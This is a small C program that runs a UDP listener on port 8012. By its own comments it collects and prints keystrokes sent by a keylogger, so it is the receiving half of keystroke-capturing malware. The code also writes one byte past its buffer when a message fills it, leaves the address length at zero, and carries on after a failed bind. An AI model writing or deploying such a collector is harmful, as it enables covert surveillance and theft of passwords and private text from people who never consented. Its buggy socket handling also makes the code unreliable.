#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>

#define PORT 8012
#define BUFF_SIZE 32

int main() {
    // create server address and client address, only init server
    struct sockaddr_in saddr, caddr;
    memset(&saddr, 0, sizeof(saddr));
    saddr.sin_family = AF_INET;
    saddr.sin_port = htons(PORT);
    saddr.sin_addr.s_addr = htonl(INADDR_ANY);

    // create socket fd 
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Couldn't socket");
        exit(1);
    }
    
    // bind fd on addr
    int try_bind = bind(sock, (struct sockaddr *) &saddr, sizeof(saddr));
    if (try_bind < 0) {
        perror("Couldn't bind");
    }
    
    // loop collects input from keylogger then prints
    printf("waiting for logger...\n");
    unsigned int client_len = 0;
    while(1) {
        char buffer[BUFF_SIZE] = {0};
        int msg_len = recvfrom(sock, buffer, BUFF_SIZE, 0, 
                      (struct sockaddr *) &caddr, &client_len);
        buffer[msg_len] = '\0'; // add null terminator, just in case
        printf("from logger: %s\n", buffer);
    }
    close(sock);
}
